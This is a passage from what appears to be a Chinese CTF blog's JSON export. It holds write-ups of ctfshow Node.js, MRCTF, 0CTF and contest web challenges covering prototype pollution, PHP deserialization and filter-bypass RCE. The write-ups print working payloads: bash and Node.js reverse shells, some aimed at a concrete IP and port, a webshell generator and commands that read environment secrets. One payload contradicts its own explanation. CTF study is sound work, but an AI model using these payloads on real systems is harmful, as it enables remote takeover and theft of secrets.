ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。参考：https://developer.aliyun.com/article/521394\n\n绕过 `open_basedir`可以参考：https://xz.aliyun.com/t/10070\n\n也就是说download.php访问文件只被限定于`:/etc:/tmp``getcwd()`也就是当前文件 三个路径 没法去读我们的文件\n\n而delete.php没有被限定 可以去读\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683817203363-4f6eda6d-8d10-4e90-a406-88afe550599b.png)\n","tags":["代码审计","phar"],"categories":["buuctf"]},{"title":"ctfshow-nodejs","url":"/post/372ab69b.html","content":"\nnodejs刷题\n\n<!--more-->\n\n# 前言\n\n因为打一次比赛做到了这个nodejs原型链污染，是一点头绪都没有，就来恶补一下，keep on！\n\n# Web-334(大小写)\n\n代码审计 \n\n给了账号和密码 账号是大写的`CTFSHOW`，但是输入的账号不能为大写，有个小写转大写的操作，输入`ctfshow`即可\n\n```php\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\n# Web-335(eval)\n\neval()用法和php差不多 都是将字符串当作代码执行\n\n这里nodejs执行命令类似于python 要调库 比如 python就要调包含目录执行的库，比如os，在nodejs里也是一样 不过这里都是通过`require('模块')`来调(不严谨 但是可以这么理解)\n\npayload:`/?eval=require('child_process').execSync('ls')`\n\n可以参考nodejs中文网https://nodejs.cn/api/child_process.html#child-process\n\n但是其他命令执行函数比如`exec()`返回都是`[object Object]`\n\n在这里只能用`execSync`\n\n# Web-336\n\n## 解法一：\n\n设置了waf\n\n读当前文件路径\n\n```\n?eval=__filename\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554090247-ff1c2fc3-f003-4545-bf76-66639c40658b.png)\n\n```\n?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')\n```\n\n这里fs模块负责读写文件\n\n读当前文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554186939-e3aed060-1725-4070-ac8c-9b1b5c3e42fa.png)\n\n过滤了`exec load`\n\n通过字符拼接绕过：`?eval=require('child_process')['exe'%2B'cSync']('ls')`\n\n`%2B`是`+`的url编码\n\n## 解法二：\n\n用fs模块读当前路径文件\n\n```\n?eval=require('fs').readdirSync('.')\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683555038903-2775ef86-cbc4-40d8-be79-40e3b7d08b79.png)\n\n直接读就行了\n\n```\n?eval=require('fs').readFileSync('fl001g.txt','utf-8')\n```\n\n这里读路径和文件命令稍有不同 不过很好记\n\n## 解法三：\n\n```\n?eval=require(\"child_process\")[\"\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63\"]('cmd')\n```\n\n利用编码绕过\n\n# Web-337(数组绕过)\n\n给了源码 类似于php的md5思路\n\n```\n?a[]=1&b[]=1\n```\n\n可以看师傅的总结 tql：https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/\n\nWeb-336的编码绕过就是看了这个师傅的\n\n# Web-338(经典原型链污染)\n\n给了源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683557652246-a808a88e-6dd5-4b14-84f1-a84d4af958d8.png)\n\n当secert对象的ctfshow属性为题目所需值就给flag\n\n那么就通过原型链污染Object的ctfshow属性 从而使得secert对象为所需值\n\n可利用点为这个copy函数 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559440720-45034e2c-417e-47c8-a101-9e188bd902f2.png)\n\n跟踪一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559770866-5f796f05-3f52-4681-9481-efbeeb866d8d.png)\n\n发现了原型链污染的经典语句\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683558958836-ddb03c4f-d761-4df2-8cc7-f9abcf68303e.png)\n\n当时做这道题题目时候有个疑问就是为什么post传输的数据是在哪里接受到的，因为是零基础js，还在慢慢摸索，又去审了一次代码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683598380991-64209db3-a460-4b75-afe7-df8776ea2216.png)\n\n```php\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  \n}\n```\n\n整个语句都是`router{}`囊括起来的,并且是通过post传参，而且还加载了`require('body-parser')`中间键。\n\nbody-parser是非常常用的一个express中间件，作用是对post请求的请求体进行解析  。\n\n除此之外为什么要用json格式传输，p神博客中也提及了，如果不用json文件发送那么`__proto__`就会被当作原型执行，导致污染失败，只有通过json格式提交，才会被当作key来执行，这样才能达到原型链污染的效果。\n\n关于nodejs请求 可以参考这篇文章比较符合我这种新手：https://www.cnblogs.com/Diamond-sjh/p/11324138.html\n\n# Web-339 (api)\n\n这道题目多了一个/api路由 并且看到了render 多了一个模板渲染\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637579498-c75155d1-168c-4366-9602-d3ef54456d8a.png)\n\n发现Function 这里借用p神的理解\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637631439-cf02616e-fcbb-443e-9873-bee89aeaab0d.png)\n\n这里query没有被定义，就会在Object对象中寻找这个属性，那么我们就向上污染Object添加一个query属性就行了 。\n\n这里提供三种payload:\n\npayload1:\n\n```\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ip/port 0>&1\\\"');var __tmp2\"}}\n```\n\n`outputFunctionName`是ejs引擎的一个属性 可以参考：https://blog.csdn.net/DARKNOTES/article/details/124000520\n\npayload2:\n\n```\n{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ip/port 0>&1\\\"')\"}}\n```\n\n没有require，所以就用 `global.process.mainModule.constructor._load`来导入 child_process\n\npayload3:\n\n```\n{\"__proto__\":{\"query\":\"var net = process.mainModule.constructor._load('net'),cp = process.mainModule.constructor._load('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(port,'ip', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;\"}}\n```\n\n Function环境下没有require函数，不能获得child_process模块，我们可以通过使用`process.mainModule.constructor._load`来代替require。  \n\n然后flag藏在环境变量里 一开始被这个坑到了\n\n# Web-340(二次污染)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683638759001-e1aa0968-7e8c-4aaf-958b-81ea9f963718.png)\n\n这里user为一个对象 他的属性userinfo也是一个对象 \n\n那么如果我们想通过copy函数通过`user.userinfo`污染到`Object.prototype`\n\n即则`user.userinfo->user(第一次污染)->Object(第二次污染)`需要污染两次\n\n路由/api的思路和上一题一样 则可以用上题的payload，嵌套一个__proto__即可\n\n `{\"__proto__\":{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 0>&1\\\"')\"}}}`\n\n\n\n# Web-341(ejs模板)\n\n没了/api路由\n\n也没有了条件输出flag\n\n看了wp是ejs的模板引擎的原型链污染rce\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683644860927-cc3a4cc9-9c22-403c-bc3c-c1af74831522.png)\n\n那么既然没有条件Function函数让我们执行命令，也没有输出flag，该怎么弄呢\n\n整体分析可参考：https://www.anquanke.com/post/id/236354#h2-2\n\n大致思路为：通过原型链污染 去覆盖这个模板渲染时的拼接代码，让其拼接进ejs模板代码种，从而渲染时进行RCE\n\n```\npayload:{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 0>&1\\\"');var __tmp2\"}}}\n```\n\n# Web-342、343(jade模板)\n\n审计源码，发现换了模板引擎\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684596147-6e4fef35-4a8e-416b-a460-35b266724fe8.png)\n\n思路与上面ejs模板相同 直接看师傅们的payload即可\n\n1. `{\"__proto__\":{\"__proto__\": {\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.###/7777 0>&1\\\"')\"}}}`\n2. `{\"__proto__\":{\"__proto__\":{\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.constructor._load('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/124.221.###.174/7777 0>&1\\\"')\"}}}`\n3. `{\"__proto__\":{\"__proto__\":{\"type\":\"Code\",\"self\":1,\"line\":\"global.process.mainModule.require('child_process').execSync('bash -c \\\" bash -i >&/dev/tcp/124.221.177.###/7777 0>&1\\\"')\"}}}`\n\n注意这里有两个大坑 坑死我了\n\n首先提交要post burp默认get\n\n最坑的是Content-Type要改为 `application/json`玛德当时这里一直是默认的 一直没改 导致一直反弹失败\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684527595-86a87036-1fd4-40cb-8708-94c204bd0d1c.png)\n\n然后再来说说找flag的方法 \n\n直接`cat /proc/self/environ`去找\n\n或者`env|grep ctfshow` 其实就是管道符把env的输出的内容当作grep(查找字符)的参数\n\n其实本质上这两者是等价的 都是在环境变量种寻找flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684961708-f7e1d476-7428-4704-a807-1a67cacfe7ba.png)\n\n# Web-344(nodejs 解析特性)\n\n给了源码：\n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n    res.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n    res.end(flag);\n  }else{\n    res.end('where is flag. :)');\n  }\n\n});\n```\n\n根据源码我们应该传\n\n```\n?query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":\"true)\"}\n```\n\n`req.url.match(/8c|2c|\\,/ig)`但是正则过滤了空字符 逗号以及其url编码 \n\n 看了大佬的wp 应该这样传`?query={\"name\":\"admin\"&query=\"password\":\"ctfshow\"&query=\"isVIP\":true}` url编码之后传上去\n\n nodejs中会把这三部分拼接起来 \n\n被传入之后req.query被解析成了一个数组，之后在JSON.parse的解析下变成了对象，就变成了我们想要的结果了。\n","tags":["nodejs原型链污染","nodejs"],"categories":["ctfshow"]},{"title":"贵阳大数据及网络安全精英对抗赛WEB部分WP","url":"/post/232bb69.html","content":"\n贵阳大数据及网络安全精英对抗赛WEB部分WP\n\n<!--more-->\n\n# 仔细ping\n\n有点看不懂的一道题目，ip去ping，返回和我们本地ping网站差不多的回显，刚开始是以为用逻辑符`|&&`之类的题目来做，后来发现想复杂了，他题目意思好像只能用他指定的命令，除此之外其他字符一律屏蔽\n\n比如 `?ip=ls`就可以合法，但是如果`?ip=l`一个字符也会被屏蔽，蛮nt的说实话。\n\npayload:`?id=ls`\n\n发现本地有flag.php\n\n直接 `?id=nl flag.php`\n\n# pop\n\n```php\n<?php\n  highlight_file(__FILE__);\nclass TT{\n  public $key;\n  public $c;\n  public function __destruct(){\n    echo $this->key;\n  }\n  \n  public function __toString(){\n    return \"welcome\";\n  }\n}\n\nclass JJ{\n  public $obj;\n  public function __toString(){\n    ($this -> obj)();\n    return \"1\";\n  }\n  public function evil($c){\n    eval($c);\n  }\n  public function __sleep(){\n    phpinfo();\n  }\n}\n\nclass MM{\n  public $name;\n  public $c;\n  public function __invoke(){\n    ($this->name)($this->c);\n  }\n  public function __toString(){\n    return \"ok,but wrong\";\n  }\n  public function __call($a, $b){\n    echo \"Hacker!\";\n  }\n}\n$a = unserialize($_GET['bbb']);\nthrow new Error(\"NoNoNo\");\n```\n\n整个链子其实不难 当时做这道题目 本地pop链已经写出来了 但是发现没法触发 \n\n```php\n<?php\nclass TT{\n    public $key;\n    public $c;\n}\n\n\nclass JJ{\n    public $obj;\n}\nclass MM{\n    public $name;\n    public $c;\n\n\n}\n$a = new TT();\n$a->key = new JJ();\n$a->key->obj=new MM();\n$a->key->obj->name ='system';\n$a->key->obj->c='cat /flag';\necho serialize($a);\n?>\n#O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:9:\"cat /flag\";}}s:1:\"c\";N;}\n```\n\n然后就会发现`throw new Error(\"NoNoNo\");`会挡在前面没法绕过，当时就寄了。\n\n这里考到了fast destruct的知识点 出自：https://zhuanlan.zhihu.com/p/405838002\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683425847710-d16be9c0-ad73-4d77-a90b-d1ddc07075b6.png)\n\n其实原理还是蛮容易理解的，当一个对象生命周期结束时，最后就会触发析构函数，但是如果我们提前破坏这个序列化后的结构，那么就会提前进入析构函数\n\n这道题目就是因为`throw new Error(\"NoNoNo\");`而进不去我们构造的链子 但是如果我们破坏我们payload链子结构 那么就会提前进入析构函数 从而触发链子\n\npayload：`?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;}`\n\n这样是完整链子没法触发的我们可以删除最后一个`}`破坏结构让他提前进入析构函数\n\n```\n?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;\n```\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683426171520-63fa6be1-39b7-446d-8fc7-98f8d3e0a425.png)\n\n# 完美网站\n\n一道很臭的题目，大概题目思路是他给了一个img参数是一个图片格式base64编码 然后还需要提交一个n参数 但是n是一个10-30的随机数字 并且每次都不一样 那么其实思路很简单直接爆破就行了 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683427463745-906d989e-5129-4618-98ae-64fc1c6c5efb.jpeg)\n\n并且要同时提交img和n 但是这描述我也是无语\n\n然后当时没发现flag文件名藏在他给的img末尾是ffffpq.php  所以一直在找flag \n\n总之做的很恶心人 像吃了屎一样yue了\n\n# notrce\n\n好像我没记错应该是这道题目\n\n源码如下\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$c=$_POST['c'];\nif(!preg_match(\"/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|>|<|`|\\*|\\\\$|\\\\\\/i\",$c)){\n    exec($c);\n}else{\n    die(\"hacker\");\n}\n```\n\n蛮玄幻的一道题目 看了wp直接用将根目录flag复制到当前目录访问就行 \n\n呢如果flag文件目录不是常规命名 这不就寄了吗\n\n之后了解到是非预期解 哦 那没事了:)\n\n# JUST_PROTO\n\n一道我未触及的领域的题目 一道nodejs的原型链污染题目\n\n这两天恶补了一下关于原型链污染的知识点，感受颇深\n\n如果之前了解过这个 其实题目一眼丁真就能看出是原型链污染的题目 `__proto__`明显就提示了\n\n给出源码：\n\n```javascript\nconst express = require('express');\nconst { exec } = require(\"child_process\");\nconst app = express();\napp.get('/', (req, res) => res.send('嗨嗨嗨！！老八来了！！！'));\n\nlet ba = {\n  baba: (token)=>{ return !!token },\n  bababa: ()=>{ if (JSON.stringify(date).length > 10000) date = {} }, \n  // set: `redis-cli -h ${ba.redis_host} set `\n  // get: `redis-cli -h ${ba.redis_host} get `\n};\n\nlet date = {};\n\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n\napp.get('/get', (req, res) => {\n  const {token, key} = req.query;\n  if (!ba.baba(token)) return res.send(\"wrong\");\n  let result = date[token];\n  if (result) result = result[key];\n  res.json({ result: result === undefined ? \"null\" : result, is_succ: result !== undefined })\n});\n\n\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n\napp.listen(8080, () => console.log(`嗨嗨嗨！！老八来了！！！`));\n\n\n//没敢吧所有变量名换成bababa 怕被打\n```\n\n先看/bkup路由\n\n```javascript\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n```\n\n发现了我们最喜欢的exec()函数\n\n `const cmd = ba.redis_set + date ${date_stream.toString('base64')};` \n\n然后这部分ba.redis_set如果我们可控则能达到rce\n\n再来看/set路由\n\n```javascript\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n```\n\n通过get方式给`token,key,var`传参\n\n`date[token][key] = val;`因为三个参数我们都可控，则可以进行原型链污染\n\n这里解释一下为什么会是`data[token][key]`的形式，我们一般认为应该是`data.token.key`的形式\n\n其实这两种形式是相等的都可以\n\n比如ctfshow有题目的payload：\n\n原本是：`?eval=require('child_process').execSync('ls')`\n\n如果改为`?eval=require('child_process')['execSync']('ls')`那么都是可以的，两种都是等价的\n\n回到原题，使得`token=__proto__,key=redis_set,var=shell`\n\n则ba.redis_se被污染\n\n```\npayload:?token=__proto__&key=redis_set&var=bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\n```\n\n解释一下为什么要用 `bash -c` 由于我们是在外部运行shell指令，所以他默认是不会识别我们的`bash -i`反弹shell的，`bash -c`保证了命令使用`bash shell`去执行\n\n反弹shell部分用url编码一下\n\n`bash -c`就是将后面字符串当作命令读入执行 然后输出  \n\n# it’s time\n\n经典flask的ssti\n\n直接当个脚本小子，大脚本注入\n\n或者去找ctfshow 题目的payload都可以\n","tags":["Fast destruct","nodejs 原型链污染"],"categories":["各赛事WP"]},{"title":"buuctf-68-[MRCTF2020]套娃","url":"/post/b79f6776.html","content":"\n[MRCTF2020]套娃\n\n<!--more-->\n\n进入题目 查看源码\n\n```cmake\n<!--\n//1st\n$query = $_SERVER['QUERY_STRING'];\n\n if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n    die('Y0u are So cutE!');\n}\n if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n    echo \"you are going to the next ~\";\n}\n!-->\n```\n\n分析：输入的字符串不能有`_`和其url编码，并且get传参b_u_p_t不能等于23333 但是正则匹配需要开头和结尾为23333\n\n这里用到了php合法变量名的知识点，如果在传参时，遇到不合法的变量名比如`.`则php会自动将其转为`_`\n\n正则匹配preg_match()通过换行符`%0a`绕过即可  在非多行模式下，$似乎会忽略在句尾的%0a\n\n可参考https://www.cnblogs.com/20175211lyz/p/12198258.html\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362389224-9f93cdc0-b997-45e9-8f7f-626ec36b4db3.png)\n\npayload:`?b.u.p.t=23333%2a`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362539907-88b3cf13-c278-4b0f-8f7a-fc105d89bf4f.png)\n\n```\n/secrettw.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362573491-a422447e-dedc-437c-bfed-400642d8c01f.png)\n\n查看源码发现一段jsfuck编码 直接在console中输入就有回显了\n\n关于jsfuck码可以参考：https://www.jianshu.com/p/e7246218f424\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362663557-fba897df-6aac-40fd-8941-3b7a8243c607.png)\n\n获得源码:\n\n```cmake\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\n\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \n\n\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?>\n```\n\nip用 `Client-ip: 127.0.0.1`写在请求头，并且只能用这个\n\n到目前为止我也不知道 Client-ip xff Real-ip 这三个在不同题目下为什么不能互用的原因 有点阴间\n\n2333用data伪协议去传参\n\n我们要读的文件file会经过change函数改变 我们只需要倒着写一个change函数 让其进过题目函数时候回到我们想要的内容即可 脚本很简单\n\n```php\n<?php\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; }\n$str = 'ZmxhZy5waHA=';   //Zm5lbTZ6dH4=\necho change($str)\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362979416-9100efcf-0951-4540-9a1b-a57509c7d87f.png)\n","tags":["php字符串解析特性"],"categories":["buuctf"]},{"title":"buuctf-66-[极客大挑战 2019]RCE ME","url":"/post/7f59ce0.html","content":"\n[极客大挑战 2019]RCE ME\n\n<!--more-->\n\n```cmake\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){\n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n\n\n这道题就是通过取反构造无数字字母rce的\n\n其实这种构造奇淫rce的 明白原理之后 直接当个脚本小子做起题来嘎嘎快\n\n生成脚本如下：\n\n```cmake\n<?php\n$ans1='assert';//函数名\n$ans2='eval($_POST[x])';//命令\n$data1=('~'.urlencode(~$ans1));//通过两次取反运算得到system\n$data2=('~'.urlencode(~$ans2));//通过两次取反运算得到dir\necho ('('.$data1.')'.'('.$data2.')'.';');\n?>\n```\n\n直接构造`system('ls')`发现不可以\n\n就很奇怪 构造`phpinfo()`找不到思路就去看看配置文件 这个真的很重要\n\npayload:`?code=(~%8F%97%8F%96%91%99%90)();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683357622168-d10c216a-c463-4f40-847a-88eecc81c4a3.png)\n\n发现原来是好多函数被禁了 难怪执行不了\n\n构造`assert(eval($_POST[x]))`生成一句话木马用蚁剑去连接\n\n注意这种eval()中再嵌套一个assert(eval())的方式 有时候可以绕过waf\n\npayload: `?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%A2%D6);`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358006276-a208a639-bd8a-4241-baa8-a5d4b64e4dcd.png)\n\n接下来的思路就是怎么绕过disble_function 具体方式可以看我这一篇文章 这里就不赘述了 https://z1d10t.github.io/post/db3afe26.html?highlight=disable\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358035645-929e3eb1-fe11-4d92-bed9-0bc5497f90d0.png)\n","tags":["RCE奇淫方式"],"categories":["buuctf"]},{"title":"buuctf-64-[0CTF 2016]piapiapia","url":"/post/6e80c399.html","content":"\n[0CTF 2016]piapiapia\n\n<!--more-->\n\n一道php反序列化字符串逃逸的题目，需要代码审计，tql！\n\n## 捋清思路：\n\n首先注册一个账号，然后登录，发现有个文件上传地方，刚开始以为是传木马，然后去连，getshell但后面发现新大陆，一顿操作之后，发现需要扫网站，下载源码。\n\n下载下来6个php文件 \n\n在config.php中发现有flag 但是被删除了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290000574-a5d69780-e1ec-48cc-a0f0-2351c7ced655.png)\n\n然后register.php与index.php都是一些基础的注册账号与登录账号的操作\n\n然后由index.php转向update.php\n\n也就是我们看到的这个界面\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290165259-d39fb665-8660-42cc-9811-c6644e2aa4e0.png)\n\n```cmake\n//update.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\tif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n\t\t$username = $_SESSION['username'];\n\t\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\t\tdie('Invalid phone');\n\n\t\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\t\tdie('Invalid email');\n\t\t\n\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n\n\t\t$file = $_FILES['photo'];\n\t\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\t\tdie('Photo size error');\n\n\t\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t\t$profile['phone'] = $_POST['phone'];\n\t\t$profile['email'] = $_POST['email'];\n\t\t$profile['nickname'] = $_POST['nickname'];\n\t\t$profile['photo'] = 'upload/' . md5($file['name']);\n  \t\t//user是class.php中的user的一个对象\n\t\t$user->update_profile($username, serialize($profile)); //我们的用户名admin和profile以序列化字符串形式传过去的\n\t\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n\t}\n\telse {\n?>\n```\n\n简单看一下就是通过post获取变量值，和一些简单的判断输入是否合法的语句，注意一下nickname(昵称)的判断\n\n```cmake\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n```\n\nnickname不能超过10个字符，之后会提及\n\n然后传入update_profile() 这里`$profile`数组是我们通过序列化传入的，这里很重要\n\n```cmake\n$user->update_profile($username, serialize($profile)); //我们的用户名admin和profile以序列化字符串形式传过去的\n```\n\n之后传入class.php\n\n```cmake\n//class.php\n<?php\nrequire('config.php');\n\nclass user extends mysql{   //继承类的生成 mysql为父类 user为子类\n\tprivate $table = 'users';\n\n\tpublic function is_exists($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::select($this->table, $where);\n\t}\n\tpublic function register($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$key_list = Array('username', 'password');\n\t\t$value_list = Array($username, md5($password));\n\t\treturn parent::insert($this->table, $key_list, $value_list);\n\t}\n\tpublic function login($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\tif ($object && $object->password === md5($password)) {\n\t\t\treturn true;\n\t\t} else {\n\t\t\treturn false;\n\t\t}\n\n\t}\n\tpublic function show_profile($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\treturn $object->profile;\n\t}\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::update($this->table, 'profile', $new_profile, $where);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\n\nclass mysql {\n\tprivate $link = null;\n\n\tpublic function connect($config) {\n\t\t$this->link = mysql_connect(\n\t\t\t$config['hostname'],\n\t\t\t$config['username'], \n\t\t\t$config['password']\n\t\t);\n\t\tmysql_select_db($config['database']);\n\t\tmysql_query(\"SET sql_mode='strict_all_tables'\");\n\n\t\treturn $this->link;\n\t}\n\n\tpublic function select($table, $where, $ret = '*') {\n\t\t$sql = \"SELECT $ret FROM $table WHERE $where\";\n\t\t$result = mysql_query($sql, $this->link);\n\t\treturn mysql_fetch_object($result);\n\t}\n\n\tpublic function insert($table, $key_list, $value_list) {\n\t\t$key = implode(',', $key_list);\n\t\t$value = '\\'' . implode('\\',\\'', $value_list) . '\\''; \n\t\t$sql = \"INSERT INTO $table ($key) VALUES ($value)\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function update($table, $key, $value, $where) {\n\t\t$sql = \"UPDATE $table SET $key = '$value' WHERE $where\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function filter($string) {     //父类filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = 